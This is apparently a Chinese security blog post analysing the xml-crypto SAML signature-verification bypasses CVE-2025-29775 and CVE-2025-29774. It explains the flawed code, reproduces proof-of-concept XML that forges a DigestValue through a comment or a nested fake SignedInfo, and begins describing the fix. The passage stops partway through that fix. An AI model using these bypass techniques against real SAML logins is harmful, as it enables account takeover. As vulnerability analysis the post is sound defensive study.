@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="背景saml 攻击在沉寂了多年后，从 24 年开始的 gitlab 和 github 账号接管漏洞开始又重新引起了大家的注意，一直到 25 年还有针对这两者的漏洞，这其中也出现了一些有意思的攻击方式。所以准备分两篇解析一下这几个新出的漏洞，本文是第一篇，介绍如何用已有的老旧攻击技术攻击现代的 saml 应用，第二篇则是一些较为新的攻击方法(对我来说如此)。 saml 认证关于 saml 认证不会多">
+<meta property="og:type" content="article">
+<meta property="og:title" content="现代 saml 攻击(1)">
+<meta property="og:url" content="http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/">
+<meta property="og:site_name" content="wude">
+<meta property="og:description" content="背景saml 攻击在沉寂了多年后，从 24 年开始的 gitlab 和 github 账号接管漏洞开始又重新引起了大家的注意，一直到 25 年还有针对这两者的漏洞，这其中也出现了一些有意思的攻击方式。所以准备分两篇解析一下这几个新出的漏洞，本文是第一篇，介绍如何用已有的老旧攻击技术攻击现代的 saml 应用，第二篇则是一些较为新的攻击方法(对我来说如此)。 saml 认证关于 saml 认证不会多">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-24T03:38:49.000Z">
+<meta property="article:modified_time" content="2025-04-25T06:30:04.535Z">
+<meta property="article:author" content="wude">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>现代 saml 攻击(1)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/me">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/22/codeql-%E6%94%B9%E8%BF%9B%E8%AE%A1%E5%88%92%E4%B8%80-fastjson-mybatis/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&text=现代 saml 攻击(1)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&is_video=false&description=现代 saml 攻击(1)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=现代 saml 攻击(1)&body=Check out this article: http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&title=现代 saml 攻击(1)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&name=现代 saml 攻击(1)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/24/%E7%8E%B0%E4%BB%A3-saml-%E6%94%BB%E5%87%BB-1/&t=现代 saml 攻击(1)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#saml-%E8%AE%A4%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">saml 认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml-crypto-CVE-2025-29775-CVE-2025-29774"><span class="toc-number">3.</span> <span class="toc-text">xml-crypto-(CVE-2025-29775 &amp; CVE-2025-29774)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitlab-CVE-2024-45409"><span class="toc-number">4.</span> <span class="toc-text">gitlab-CVE-2024-45409</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GitHub-CVE-2024-4985-CVE-2024-9487"><span class="toc-number">5.</span> <span class="toc-text">GitHub-(CVE-2024-4985&amp;CVE-2024-9487)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">6.</span> <span class="toc-text">reference</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        现代 saml 攻击(1)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wude</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-24T03:38:49.000Z" class="dt-published" itemprop="datePublished">2025-04-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>saml 攻击在沉寂了多年后，从 24 年开始的 gitlab 和 github 账号接管漏洞开始又重新引起了大家的注意，一直到 25 年还有针对这两者的漏洞，这其中也出现了一些有意思的攻击方式。所以准备分两篇解析一下这几个新出的漏洞，本文是第一篇，介绍如何用已有的老旧攻击技术攻击现代的 saml 应用，第二篇则是一些较为新的攻击方法(对我来说如此)。</p>
+<h2 id="saml-认证"><a href="#saml-认证" class="headerlink" title="saml 认证"></a>saml 认证</h2><p>关于 saml 认证不会多讲，简要介绍一下在认证过程中如何实现签名验证以确保报文的安全。先来看 saml response 的格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">saml2p:Response</span> <span class="attr">Destination</span>=<span class="string">&quot;acsurl&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;id1857861521424404880641928&quot;</span> <span class="attr">...</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">saml2:Assertion</span> <span class="attr">ID</span>=<span class="string">&quot;id1857861521593646366230134&quot;</span> <span class="attr">...</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">saml2:Issuer</span>&gt;</span>samlissuer<span class="tag">&lt;/<span class="name">saml2:Issuer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ds:Signature</span> <span class="attr">xmlns:ds</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ds:SignedInfo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ds:CanonicalizationMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ds:SignatureMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ds:Reference</span> <span class="attr">URI</span>=<span class="string">&quot;#id1857861521593646366230134&quot;</span>&gt;</span></span><br><span class="line">                    ...</span><br><span class="line">                    <span class="tag">&lt;<span class="name">ds:DigestValue</span>&gt;</span>puw8MLNZ67893HzfgbpLjGPfsdSBJueFbcSw2neguIuk=<span class="tag">&lt;/<span class="name">ds:DigestValue</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ds:Reference</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ds:SignedInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ds:SignatureValue</span>&gt;</span>assertionsignaturevalue<span class="tag">&lt;/<span class="name">ds:SignatureValue</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ds:KeyInfo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ds:X509Data</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ds:X509Certificate</span>&gt;</span>x509certificate<span class="tag">&lt;/<span class="name">ds:X509Certificate</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ds:X509Data</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ds:KeyInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ds:Signature</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">saml2:Subject</span> <span class="attr">xmlns:saml2</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">saml2:Subject</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">saml2:AttributeStatement</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">saml2:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">saml2:AttributeValue</span> <span class="attr">...</span>&gt;</span>idp-id<span class="tag">&lt;/<span class="name">saml2:AttributeValue</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">saml2:Attribute</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">saml2:AttributeStatement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">saml2:Assertion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">saml2p:Response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中用来确保完整性的是 DigestValue 和 SignatureValue，DigestValue 会与 Reference 指向的 id 对应的 xml 文档先进行规范化后哈希得到的值进行比较，在这里就是 Assertion 标签及其包含的内容，确保整个 Assertion 没有被修改。这是其中一种，还有一种是 Signature 标签指向的是整个 Response 内容。那能不能也将 DigestValue 修改以匹配修改后的 Assertion？这就是 SignatureValue 起作用的地方，SignatureValue 用不对称加密计算得到，对 Signature 内的 SignedInfo 进行计算得到的值与 SignatureValue 比较，SignatureValue 需要通过私钥生成，确保了安全性。</p>
+<p>所以 saml 是通过两个签名值确保了各个部分的完整性。看起来很合理，但是后面我们就会看到不同的实现方式带来的各种绕过。所谓政策是好的，只是执行的人出了错。。。</p>
+<h2 id="xml-crypto-CVE-2025-29775-CVE-2025-29774"><a href="#xml-crypto-CVE-2025-29775-CVE-2025-29774" class="headerlink" title="xml-crypto-(CVE-2025-29775 &amp; CVE-2025-29774)"></a>xml-crypto-(CVE-2025-29775 &amp; CVE-2025-29774)</h2><p>两个漏洞只是利用方式不一样，可以看成是一个地方的漏洞。</p>
+<p>涉及到的是 js 的 saml 库：xml-crypto(<a target="_blank" rel="noopener" href="https://github.com/node-saml/xml-crypto)%E3%80%82%E7%94%B1%E4%BA%8E%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%A8%8D%E5%BE%AE%E7%AE%80%E5%8D%95%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E6%AC%A1%E6%8D%A2%E4%B8%AA%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%85%88%E7%9C%8B%E5%AE%98%E6%96%B9%E9%80%9A%E5%91%8A%E7%BB%99%E7%9A%84">https://github.com/node-saml/xml-crypto)。由于这个漏洞稍微简单，所以这次换个方式，直接先看官方通告给的</a> poc 去先理解哪里出了错。参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></li>
+</ul>
+<p>CVE-2025-29774：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">SomeNode</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Reference</span> <span class="attr">URI</span>=<span class="string">&quot;somefakereference&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">DigestValue</span>&gt;</span>forgeddigestvalue<span class="tag">&lt;/<span class="name">DigestValue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Reference</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">SomeNode</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Reference</span> <span class="attr">URI</span>=<span class="string">&quot;realsignedreference&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">DigestValue</span>&gt;</span>realdigestvalue<span class="tag">&lt;/<span class="name">DigestValue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Reference</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">SignedInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>CVE-2025-29775</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DigestValue</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;</span></span><br><span class="line">    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=</span><br><span class="line"><span class="tag">&lt;/<span class="name">DigestValue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先看 29775。一个注释的 DigestValue，和一个正常的 DigestValue。所以这里的攻击方式会是什么？</p>
+<p>首先回顾一下，DigestValue 既用来表示 Assertion 的完整性，又参与 SignatureValue 的计算，如果两个 DigestValue 用来参与不同的步骤，则可能会出现绕过，这也是这里出漏洞的地方。</p>
+<p>首先计算 Assertion 得到的值与注释的 DigestValue 比较，注释的值可控，所以这里可以填入任意值。然后计算 SignatureValue 的时候注释不参与，所以使用合法的 DigestValue，校验也会通过。</p>
+<p>再看 29774，其实也是差不多的，只不过这里多了整个 SignedInfo，从名字也可以看出，第一个 SignedInfo 是用来校验  DigestValue 的，第二个是用来校验 SignatureValue 的。</p>
+<p>大致清楚了漏洞原理之后，再来看 xml-crypto 的代码逻辑，先从官方给的 example.js 例子来看：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateXml</span>(<span class="params">xml, key</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> doc = <span class="keyword">new</span> <span class="title function_">dom</span>().<span class="title function_">parseFromString</span>(xml);</span><br><span class="line">  <span class="keyword">const</span> signature = <span class="title function_">select</span>(</span><br><span class="line">    <span class="string">&quot;/*/*[local-name(.)=&#x27;Signature&#x27; and namespace-uri(.)=&#x27;http://www.w3.org/2000/09/xmldsig#&#x27;]&quot;</span>,</span><br><span class="line">    doc,</span><br><span class="line">  )[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> sig = <span class="keyword">new</span> <span class="title class_">SignedXml</span>();</span><br><span class="line">  sig.<span class="property">publicCert</span> = key;</span><br><span class="line">  sig.<span class="title function_">loadSignature</span>(signature.<span class="title function_">toString</span>());</span><br><span class="line">  <span class="keyword">const</span> res = sig.<span class="title function_">checkSignature</span>(xml);</span><br><span class="line">  <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sig.<span class="property">validationErrors</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先来解释一下这段代码作用，用来验证 xml 签名是否有效，xml 是输入，通过 xpath 选择跟节点下的第一个 signature 节点，然后通过 loadSignature 完成初始化动作，再调用 checkSignature 对整个 xml 进行验签。来看 loadSignature 做了什么，只挑选关键的。</p>
+<p>第一步验签是这个过程：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-<span class="attr">checkSignature</span>:</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">getReferences</span>().<span class="title function_">every</span>(<span class="function">(<span class="params">ref</span>) =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">validateReference</span>(ref, doc)))&#123;...&#125;</span><br><span class="line">-<span class="attr">validateReference</span>:</span><br><span class="line"><span class="keyword">if</span> (!utils.<span class="title function_">validateDigestValue</span>(digest, ref.<span class="property">digestValue</span>))</span><br></pre></td></tr></table></figure>
+<p>再来看看 ref.digestValue 怎么来的：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-<span class="attr">loadSignature</span>:</span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">loadReference</span>(reference);</span><br><span class="line">-<span class="attr">loadReference</span>:</span><br><span class="line">nodes = utils.<span class="title function_">findChildren</span>(refNode, <span class="string">&quot;DigestValue&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> firstChild = nodes[<span class="number">0</span>].<span class="property">firstChild</span>;</span><br><span class="line"><span class="keyword">const</span> digestValue = firstChild.<span class="property">data</span>;</span><br></pre></td></tr></table></figure>
+<p>所以问题在于这里怎么取值，从代码可以看出是 xmldom 这个库进行 xml 的处理，写个 demo 验证一下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">DOMParser</span>, <span class="title class_">XMLSerializer</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@xmldom/xmldom&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`&lt;DigestValue&gt;&lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=&lt;/DigestValue&gt;`</span></span><br><span class="line"><span class="keyword">const</span> doc = <span class="keyword">new</span> <span class="title class_">DOMParser</span>().<span class="title function_">parseFromString</span>(source, <span class="string">&#x27;text/xml&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; doc.<span class="property">childNodes</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> child = doc.<span class="property">childNodes</span>[i];</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(child.<span class="property">localName</span>)</span><br><span class="line">    <span class="keyword">if</span>(child.<span class="property">localName</span> == <span class="string">&quot;DigestValue&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> firstChild = child.<span class="property">firstChild</span>;</span><br><span class="line">		<span class="keyword">const</span> digestValue = firstChild.<span class="property">data</span>;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(digestValue);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面代码按照漏洞代码编写，得到的结果是：<code>TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=</code>，也就是注释中的值。所以也就可以说明是可以通过注释的方式伪造一个虚假的 DigestValue，至于 xmldom 为什么这么处理，以及其他库是不是这么处理的暂时不管。</p>
+<p>这里只是第一步，第二步验签的时候还需要获取到真实的值而不是伪造的值，看一下第二步是怎么处理的：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> signedInfoCanon = <span class="variable language_">this</span>.<span class="title function_">getCanonSignedInfoXml</span>(doc);</span><br><span class="line"><span class="keyword">const</span> verified = signer.<span class="title function_">verifySignature</span>(signedInfoCanon, key, <span class="variable language_">this</span>.<span class="property">signatureValue</span>);</span><br></pre></td></tr></table></figure>
+<p>从名称就可以看到是取到规范化后的文档，并且查看代码也确实会有 canonicalizationAlgorithm 的处理。所以可以合理的猜测这个规范化处理的时候会去掉注释的值，只剩下真实的 DigestValue，这个值去验签当然是没问题的。</p>
+<p>上面解释了 29775 的来源，29774 发生在 loadSignature 过程：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> references = xpath.<span class="title function_">select</span>(</span><br><span class="line">      <span class="string">&quot;.//*[local-name(.)=&#x27;SignedInfo&#x27;]/*[local-name(.)=&#x27;Reference&#x27;]&quot;</span>,</span><br><span class="line">      signatureNode,</span><br><span class="line">    );</span><br><span class="line"><span class="keyword">const</span> signatureValue = xpath.<span class="title function_">select1</span>(</span><br><span class="line">      <span class="string">&quot;.//*[local-name(.)=&#x27;SignatureValue&#x27;]/text()&quot;</span>,</span><br><span class="line">      signatureNode,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+<p>可以看到取 references 的代码，使用了 <code>.//*</code> 意味着任意的 reference 标签，只要排在第一个就行了。所以造成了 29774 的绕过，通过一个不存在的标签并且放在正确的 SignedInfo 上面，就会绕过正确的值而取到我们伪造的。</p>
+<p>至于第二个验签过程，来看一下 getCanonSignedInfoXml 函数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> signedInfo = utils.<span class="title function_">findChildren</span>(<span class="variable language_">this</span>.<span class="property">signatureNode</span>, <span class="string">&quot;SignedInfo&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>这样就很好理解了，我们伪造的 SignedInfo 上面还包了一个 SomeNode 标签，通过 children 只能获取到下面的真实的 SignedInfo，验签可以通过。</p>
+<p>所以本质上两种都是为了 DigestValue 的伪造，也不算伪造吧，就是在两个阶段的验签过程使用两个不同的 DigestValue。</p>
+<p>来看看修复。</p>
+<p>首先是 checkSignature 函数，将 references 置空，重新从输入的 xml 开始，使用 getCanonSignedInfoXml 获取 SignedInfo，确保了注释等不存在了(修复 29775)：</p>
